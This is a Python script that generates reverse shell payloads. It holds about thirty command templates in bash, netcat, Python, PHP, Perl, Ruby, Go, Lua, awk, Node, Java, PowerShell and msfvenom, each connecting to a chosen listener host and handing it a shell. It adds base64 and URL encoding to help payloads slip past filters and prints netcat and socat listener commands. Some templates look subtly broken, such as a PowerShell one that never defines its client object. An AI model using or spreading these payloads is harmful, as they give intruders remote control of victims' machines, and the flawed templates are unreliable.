#!/usr/bin/env python3
"""
Reverse Shell Generator
Generates reverse shell payloads for various languages and environments
"""

import argparse
import base64
import urllib.parse

# Reverse shell templates
SHELL_TEMPLATES = {
    "bash": """bash -i >& /dev/tcp/{host}/{port} 0>&1""",
    
    "bash196": """0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196""",
    
    "bash2": """/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1""",
    
    "nc": """nc -e /bin/sh {host} {port}""",
    
    "nc_c": """nc -c /bin/sh {host} {port}""",
    
    "ncat": """ncat {host} {port} -e /bin/sh""",
    
    "ncat2": """ncat --udp {host} {port} -e /bin/sh""",
    
    "curl": """curl https://reverse-shell.sh/{host}:{port}""",
    
    "rustcat": """rcat connect -s bash {host} {port}""",
    
    "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
    
    "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
    
    "php": """php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
    
    "php2": """php -r '$sock=fsockopen("{host}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
    
    "php3": """php -r '$sock=fsockopen("{host}",{port});system("/bin/sh -i <&3 >&3 2>&3");'""",
    
    "php4": """php -r '$sock=fsockopen("{host}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
    
    "php5": """php -r '$sock=fsockopen("{host}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'""",
    
    "perl": """perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
    
    "ruby": """ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
    
    "ruby2": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""",
    
    "go": """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go""",
    
    "lua": r"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
    
    "lua2": """lua5.1 -e 'local host, port = "{host}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
    
    "awk": """awk 'BEGIN {s = "/inet/tcp/0/{host}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""",
    
    "node": """node -e 'sh = require("child_process").spawn("/bin/sh");net.createServer(function(c){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}).listen({port},"{host}");'""",
    
    "java": """r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();""",
    
    "javascript": """String cmd = "var host = '{host}'; var port = {port}; var process = '/bin/sh'.split(' ');var p = new java.lang.ProcessBuilder(process).redirectErrorStream(true).start();var s = new java.net.Socket(host, port);var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();var po = p.getOutputStream(), so = s.getOutputStream();while (!s.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (pe.available() > 0) so.write(pe.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (e) {}};p.destroy();s.close();";""",
    
    "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
    
    "powershell2": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
    
    "msf": """msfvenom -p linux/x86/shell_reverse_tcp LHOST={host} LPORT={port} -f elf > shell.elf""",
    
    "msf2": """msfvenom -p windows/shell_reverse_tcp LHOST={host} LPORT={port} -f exe > shell.exe""",
}


def generate_shell(shell_type, host, port, encode=None):
    """Generate reverse shell payload"""
    if shell_type not in SHELL_TEMPLATES:
        print(f"[!] Unknown shell type: {shell_type}")
        print(f"[*] Available types: {', '.join(SHELL_TEMPLATES.keys())}")
        return None
    
    payload = SHELL_TEMPLATES[shell_type].format(host=host, port=port)
    
    if encode:
        if encode == "base64":
            payload = base64.b64encode(payload.encode()).decode()
            payload = f"echo {payload} | base64 -d | bash"
        elif encode == "url":
            payload = urllib.parse.quote(payload)
        elif encode == "double_url":
            payload = urllib.parse.quote(urllib.parse.quote(payload))
    
    return payload


def list_shells():
    """List available shell types"""
    print("Available reverse shell types:")
    print("-" * 50)
    
    categories = {
        "Bash": ["bash", "bash196", "bash2"],
        "Netcat": ["nc", "nc_c", "ncat", "ncat2"],
        "Python": ["python", "python3"],
        "PHP": ["php", "php2", "php3", "php4", "php5"],
        "Perl": ["perl"],
        "Ruby": ["ruby", "ruby2"],
        "Go": ["go"],
        "Lua": ["lua", "lua2"],
        "Awk": ["awk"],
        "Node.js": ["node"],
        "Java": ["java", "javascript"],
        "PowerShell": ["powershell", "powershell2"],
        "Metasploit": ["msf", "msf2"],
        "Other": ["curl", "rustcat"],
    }
    
    for category, shells in categories.items():
        print(f"\n{category}:")
        for shell in shells:
            if shell in SHELL_TEMPLATES:
                print(f"  - {shell}")


def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t bash -H 10.10.10.10 -P 4444
  %(prog)s -t python3 -H 10.10.10.10 -P 4444 --encode base64
  %(prog)s --list
        """
    )
    
    parser.add_argument("-t", "--type", help="Shell type (use --list to see all)")
    parser.add_argument("-H", "--host", help="Listener IP address")
    parser.add_argument("-P", "--port", type=int, help="Listener port")
    parser.add_argument("-e", "--encode", choices=["base64", "url", "double_url"],
                        help="Encode payload")
    parser.add_argument("-l", "--list", action="store_true",
                        help="List available shell types")
    parser.add_argument("--listener", action="store_true",
                        help="Show listener setup commands")
    
    args = parser.parse_args()
    
    if args.list:
        list_shells()
        return
    
    if not args.type or not args.host or not args.port:
        parser.print_help()
        return
    
    # Generate payload
    payload = generate_shell(args.type, args.host, args.port, args.encode)
    
    if payload:
        print("\n" + "="*60)
        print("REVERSE SHELL PAYLOAD")
        print("="*60)
        print(f"\nType: {args.type}")
        print(f"Target: {args.host}:{args.port}")
        if args.encode:
            print(f"Encoding: {args.encode}")
        print("\nPayload:")
        print("-"*60)
        print(payload)
        print("-"*60)
        
        if args.listener:
            print("\n" + "="*60)
            print("LISTENER SETUP")
            print("="*60)
            print(f"\nnc -lvnp {args.port}")
            print(f"\n# Or with rlwrap for better experience:")
            print(f"rlwrap nc -lvnp {args.port}")
            print(f"\n# Or with socat for full TTY:")
            print(f"socat file:`tty`,raw,echo=0 TCP-L:{args.port}")


if __name__ == "__main__":
    main()
